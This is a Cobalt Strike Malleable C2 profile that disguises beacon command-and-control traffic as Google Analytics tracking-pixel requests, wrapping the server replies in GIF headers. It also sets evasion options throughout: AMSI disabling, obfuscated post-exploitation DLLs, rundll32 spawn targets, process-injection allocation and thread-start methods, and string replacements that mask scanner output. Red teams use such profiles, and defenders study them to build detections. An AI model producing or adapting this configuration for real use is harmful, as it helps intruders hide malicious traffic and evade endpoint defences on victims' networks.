# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker

set sleeptime "5000";

http-get {
	set uri "/__utm.gif";
	client {
		parameter "utmac" "UA-2202604-2";
		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		metadata {
			netbios;
			prepend "__utma";
			parameter "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			# hexdump pixel.gif
			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
			# 0000020 01 00 01 00 00 02 01 44 00 3b 

			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

			print;
		}
	}
}

http-post {
	set uri "/___utm.gif";
	client {
		header "Content-Type" "application/octet-stream";

		id {
			prepend "UA-220";
			append "-2";
			parameter "utmac";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		output {
			print;
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

# dress up the staging process too
http-stager {
	server {
		header "Content-Type" "image/gif";
	}
}

post-ex {
      # control the temporary process we spawn to
      set spawnto_x86 "%windir%\\syswow64\\rundll32.exe"; 
      set spawnto_x64 "%windir%\\sysnative\\rundll32.exe";

      # change the permissions and content of our post-ex DLLs 
      set obfuscate "true";

      # change our post-ex output named pipe names... 
      set pipename "evil_####, stuff\\not_##_ev#l";

      # pass key function pointers from Beacon to its child jobs 
      set smartinject "true";

      # disable AMSI in powerpick, execute-assembly, and psinject 
      set amsi_disable "true";

      # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
      set cleanup "true";

      transform-x64 {
            # replace a string in the port scanner dll
            strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

            # replace a string in all post exploitation dlls
            strrep "is alive." "is up.";
      }

      transform-x86 {
            # replace a string in the port scanner dll
            strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

            # replace a string in all post exploitation dlls
            strrep "is alive." "is up.";
      }
}

process-inject {
     # set how memory is allocated in a remote process for injected content
     set allocator "VirtualAllocEx";
 
     # set how memory is allocated in the current process for BOF content
     set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
 
     # shape the memory characteristics for injected and BOF content
     set min_alloc "16384";
     set startrwx "true";
     set userwx    "false";
 
     # transform x86 injected content
     transform-x86 {
         prepend "\x90\x90";
     }
 
     # transform x64 injected content
     transform-x64 {
          append "\x90\x90";
     }
 
     # determine how to execute the injected code
     execute {
		ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x1";
		CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        RtlCreateUserThread;
     }
}

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
   set copy_pe_header "false";
}
